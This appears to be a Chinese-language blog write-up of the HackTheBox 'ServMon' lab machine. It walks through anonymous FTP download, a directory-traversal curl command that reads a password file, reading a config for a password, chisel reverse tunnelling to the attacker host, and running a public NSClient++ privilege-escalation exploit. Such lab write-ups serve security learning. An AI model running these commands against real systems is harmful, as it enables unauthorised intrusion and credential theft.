---
layout: post
title: "[HackTheBox] Servmon Writeup"
subtitle: "少數有防毒軟體的靶機，但我沒有做AV Evation嘿嘿"
date: 2024-01-15
author: "Peter"
header-img: "img/post-bg-2023.jpg"
tags: [資安, writeup, hackthebox]
---

# [Windows][HTB] ServMon

厄嗯，這台靶機是相對比較惱人的一台，在一開始的階段我們透過查找可以找到一些文件表示密碼的位子，接著透過既有的web server的漏洞就可以拿到ssh的用戶密碼，可惜的是在提權階段因為防毒軟體的關係拿到反向的shell是十分困難，這邊簡單地透過windows的type指令拿到了root hash，進一步拿到reverse shell的話需要去應對防毒軟體，就不在這邊多做敘述。

<aside>
💡 包含所有系列的 writeup ，hackthebox 中所使用的本地ip與遠端ip會因為靶機的關係有所更動，請無視ip的變化。
</aside>

## Nmap Port Scan

```bash
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp   open  http          syn-ack ttl 127
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5666/tcp open  tcpwrapped    syn-ack ttl 127
6699/tcp open  napster?      syn-ack ttl 127
8443/tcp open  ssl/https-alt syn-ack ttl 127
```

省略了一些我個人覺得不太重要的資訊。這邊我們可以看到有ftp, ssh, smb, http, https，還有很奇怪的5666及6699。透過這個nmap我們並沒有看到一些特別奇怪的資訊，這些需要我們一個一個去找。

## FTP server enumeration

首先我們來看ftp，我們發現ftp是可以匿名登入的，透過匿名登入我們下載了一些資料，裡面包含了一些非常有價值的資訊。

```bash
# -m 代表著 -N -r -l inf --no-remove-listing，也就是下載所有檔案的意思， .listing 雖然有點惱人，但是-m是一個比較輕鬆的指令所以我都習慣直接這樣用

wget -m ftp://anonymous:anonymous@10.129.227.77
```

![Untitled](/img/in-post/servmon/Untitled1.png)

![Untitled](/img/in-post/servmon/Untitled.png)

在這邊我們可以看到幾個重點

1. Nadine把Nathan的 `Passwods.txt` 放在了桌面
2. NVMS的密碼被改過
3. NSClient的存取權限被限制
4. NVMS可以被外面存取
5. (可能) Passwords.txt 沒有被更新，還放在桌面

掌握了這些資訊，我們可以大致上判斷出

1. 密碼可能可以透過某些方法被存取
2. 有兩個web service，NVMS與NSClient
3. NVMS可能是漏洞，因為NSClient的存取權已經被限制

## NVMS Exploit

我們直接看打開的web service，跟我們上面猜測的一樣，port 80 跑的是 nvms ，而port 8443 跑的是 nsclient++。兩個服務我們雖然都可以碰到，但都沒有登入的密碼。

我們直接去查漏洞的話，發現[nvms有一個 Directory Traversal 的漏洞](https://www.exploit-db.com/exploits/48311)，這就有趣了，可以直接連結到我們上面的 Passwords.txt ，果不其然，我們可以簡單的看到密碼。

```bash
# 如果不用 --path-as-is 的話，curl會先處理url而會自動地把 ../ 去掉，這樣就達不成我們要的結果了
curl 'http://10.129.227.77/../../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt' --path-as-is
```

![Untitled](/img/in-post/servmon/Untitled2.png)

而後我們用crackmapexec去察看密碼歸屬的話，我們就成功拿到了 `nadine` 的帳號密碼，也成功地讓我們登入了ssh從而取得user hash。

![Untitled](/img/in-post/servmon/Untitled3.png)

![Untitled](/img/in-post/servmon/Untitled4.png)

## NSClient++ Privilege Escalation

接下來我們拿到user之後就要進到pe的階段，我們先看到8443運行著NSClient++但是我們沒有密碼，同時在上網搜尋的時候都說這是一個可以進行PE的漏洞，於是我們照著[網路上的說明](https://www.exploit-db.com/exploits/46802)進行，也成功地拿到了密碼。

```bash
type "c:\program files\nsclient++\nsclient.ini"
```

![Untitled](/img/in-post/servmon/Untitled5.png)

但我們發現，在我們遠端連線的時候沒辦法成功登入NSClient++，這也跟我們在FTP文件裡面看到的敘述相符，我們可以試著用 `chisel.exe` 做 Port Forwarding 到我們的主機上來。

![[https://10.129.227.77:8443/index.html#/settings](https://10.129.227.77:8443/index.html#/settings)](/img/in-post/servmon/Untitled6.png)

[https://10.129.227.77:8443/index.html#/settings](https://10.129.227.77:8443/index.html#/settings)

> NSClient++ 有點卡，要多F5幾次。

```bash
# local maching
/opt/chisel/chisel server -p 8081 --reverse
# target machine
.\chisel.exe client 10.10.14.14:8081 R:8443:127.0.0.1:8443
```

![[https://127.0.0.1:8443/index.html#/settings](https://127.0.0.1:8443/index.html#/settings)](/img/in-post/servmon/Untitled7.png)

[https://127.0.0.1:8443/index.html#/settings](https://127.0.0.1:8443/index.html#/settings)

接下來我們可以用 github 上面的腳本來跑，理論上也可以直接用 NSClient++ 來跑，但我發現設定有夠不人性化，用腳本跑簡單很多。我們這邊把 root.txt 移到桌面，就可以看到內容了。記得要等一下，因為是走排程。

[https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation)

```bash
python3 exploit.py 'type C:\\users\\administrator\\Desktop\\root.txt > c:\\proof.txt"' https://localhost:8443 ew2x6SsGTxjRwXOT
```

![Untitled](/img/in-post/servmon/Untitled8.png)

這個靶機就到這裡囉，至於防毒軟體有多機車，這邊就不做 AV Evasion 了，有興趣請參考網路上的各大 Writeup。


--- 

感謝閱讀，本篇文章同步發表於FB粉絲專頁[PP學習筆記](https://www.facebook.com/pplearningnote)